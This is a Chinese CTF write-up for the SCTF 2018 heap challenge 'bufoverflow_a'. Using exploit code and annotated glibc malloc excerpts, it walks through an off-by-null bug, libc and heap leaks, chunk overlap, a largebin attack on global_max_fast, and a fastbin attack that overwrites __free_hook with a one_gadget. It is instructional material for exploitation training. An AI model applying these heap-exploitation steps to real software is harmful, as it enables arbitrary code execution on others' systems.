# Write Up #
# bufoverflow_a #
## 1.题目分析 ##
刚碰到题目时以为是overlap+Unlink，但实际操作时才知道完全走不通。后面也是再看了大牛的报告后才知道原来是利用largebin attack修改global\_max\_fast后再利用fastbin attack的思路，膜拜！！！。  
程序的漏洞点相对好找，主要位于read_buf函数中，该函数存在一个明显的off by null漏洞。  
**漏洞点：**  
![vul](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_vul.JPG)  

## 2.利用思路 ##

这道题目可以利用Largebin Attack ， Unsortedbin Attack（利用这种方法有两种模式）来解决。本文重点介绍Largebin Attack利用方法，在最后的利用脚本中会给出另外两种方法的脚本。

### 2.1 leak libc address ###
老方法，申请一个大于fastbin的chunk，然后将其释放。
### 2.2 leak heap address ###
申请smallbin chunk0，chunk1，chunk2，chunk3,然后free(0),free(2),free(3),此时chunk2会和chunk3合并到top chunk中，然后再次申请一个smallbin chunk，则其fd字段（实则为chunk2的fd）就保存着heap address。

	#step 2: leak heap address
	Delete(1)
	Delete(0)
	//free(0)和free(1)是为了还原为最初状态，否则，再次申请chunk将会调用calloc，会清空fd字段。

	Alloc(0x100)	#0
	Alloc(0x100)	#1
	Alloc(0x200)	#2
	Alloc(0x100)	#3

	Delete(0)
	Delete(2)
	Delete(3)

	Alloc(0x200)	#0
	Show()
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)
### 2.3 overlap ###
首先申请chunk0，chunk1，chunk2。然后释放chunk0，并再次申请同样size的chunk，将chunk0申请回来，然后对chunk0进行填充伪造，并使其发生一字节溢出（null字节）。

	Alloc(0x108)	#0
	Alloc(0x4f0)	#1
	Alloc(0x100)	#2

	Delete(0)
	Alloc(0x108)	#0

	fake_fd = heap_addr - 0x18 + 0x18
	fake_bk = heap_addr - 0x10 + 0x18

	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x100,'\x00')
	payload += p64(0x100)
	Fill(payload)
伪造的chunk内容为：  

	|       presize=0x0      |       size=0x101       |
	| fd=heap_addr-0x18+0x18 | bk=heap_addr-0x10+0x18 |
	|*************************************************|
	|*************...................*****************|
	|************....................*****************|
	|      presize=x0100     | size=size & 0xffffff00 |

	Delete(1)
然后free(1),触发前向unlink。

	Alloc(0xf0)		#1
	Alloc(0x4f0)	#3

	Delete(0)
	Alloc(0x100)	#0
	payload = p64(0) + p64(0x711)
	Fill(payload)
此时，chunk0与chunk1发生overlap，可以通过chunk0覆写chunk1的size字段。

	Delete(3)
	Alloc(0x500)	#3

	Delete(1)
	Alloc(0x700)	#1

	global_max_fast = libc.address + 0x39B7D0
	lg('global_max_fast',global_max_fast)
	payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)+'A'*(0x4f0-0x20)+p64(0x21)*8
	Fill(payload)
此时largebin链表中保存着一块大小为0x500的chunk，通过overlap覆写改写该chunk的fd，bk，fd\_nextsize,bk\_nextsize字段。改写后的largebin chunk如下所示：

	||        presize = 0x0       ||             size = 0x501             ||
	|| 		    fd = 0x0          ||            bk = heap_addr            ||
	||      fd_nextsize= 0x0      || bk_nextsize = global_max_fast - 0x20 ||
之所以要修改为这样是为了触发之后的largebin attack。  
在这里我们首先看下，largebin在申请过程中存在下列关键代码：

	while ((unsigned long) size < chunksize_nomask (fwd))
	{
		fwd = fwd->fd_nextsize;
		assert (chunk_main_arena (fwd));
	}
	//遍历链表，寻找小于等于victim的chunk
	if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
		/* Always insert in the second position.  */
		fwd = fwd->fd;
		//由于当前链表中已经存在该大小的chunk，因此不再将victim chunk链入fd_nextsize和bk_nextsize组成的链表中
	else
	{
		victim->fd_nextsize = fwd;
		victim->bk_nextsize = fwd->bk_nextsize;
		fwd->bk_nextsize = victim;
		victim->bk_nextsize->fd_nextsize = victim;	//关键语句
	}
	
其中victim即是当前要插入largebin链表的chunk，其中  
victim->bk\_nextsize->fd\_nextsize = fwd->bk\_nextsize->fd\_nextsize = global\_max\_fast - 0x20 + 0x20  
即global\_max\_fast = victim。达到了修改global\_max\_fast值的目的。

	Alloc(0x510)	#4
	Alloc(0x510)	#5
	Delete(4)
	Delete(0)
	Alloc(0x100)
因此通过释放chunk4，chunk0，然后再次分配chunk0大小的chunk（此时在unsortedbin中存在chunk0和chunk4，chunk4先于chunk0加入，会被先遍历到），将chunk4加入largebin链表来触发largebin attack。

另外一种可以用来改写global\_max\_fast的chunk伪造方法为

	||        presize = 0x0       ||             size = 0x501             ||
	|| 		    fd = 0x0          ||        bk = glboal_max_fast - 0x10   ||
	||      fd_nextsize= 0x0      ||          bk_nextsize = heap_addr     ||

由于在largebin chunk存在两个链表，因此还可以利用fd，bk指针构成的链表达到给global\_max\_fast赋值的目的。其中fd，bk组成的链表加入chunk的语句如下所示。

	bck = fwd->bk;	//关键语句
	victim->bk = bck;
	victim->fd = fwd;
	fwd->bk = victim;
	bck->fd = victim;	//关键语句
### 2.4 fastbin attack ###
fastbin attack的攻击过程如下所示：  
1.申请大小为0x110的chunk0，覆写chunk1的size字段。  
2.释放chunk1，释放chunk0。  
3.此时chunk1已在fastbin链表中，再次申请chunk0，修改chunk1的fd字段为heap\_addr+8（很精妙的借助heap\_cur->ptr指针达到修改free\_hook的目的）。  
4.再次申请chunk1，此时chunk1所在的fastbin链表中的fd指针就指向了heap\_addr+8。  
5.释放chunk0，然后再申请chunk0，是的heap\_cur->size的值为0x100，为了接下来绕过fastbin检查。  
6.再次申请大小为0x100的chunk，即可随意改写heap\_cur->ptr指针。


	Alloc(0x100)
	Fill(p64(0)+p64(0x101))
	Delete(1)
	Delete(0)
	Alloc(0x100)
	Fill(p64(0)+p64(0x101)+p64(heap_addr+8))
	Alloc(0xf0)
	Delete(0)
	Alloc(0x100)
	Alloc(0xf0)

	free_hook = libc.symbols['__free_hook']
	Fill(p64(free_hook))

	magic = 0x4526a
	magic = 0x3f52a
	Fill(p64(libc.address+magic))
	Delete(0)

## 3.exploit代码 ##
Largebin Attack 利用脚本：  
[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py)

Unsortedbin Attack 利用脚本：  

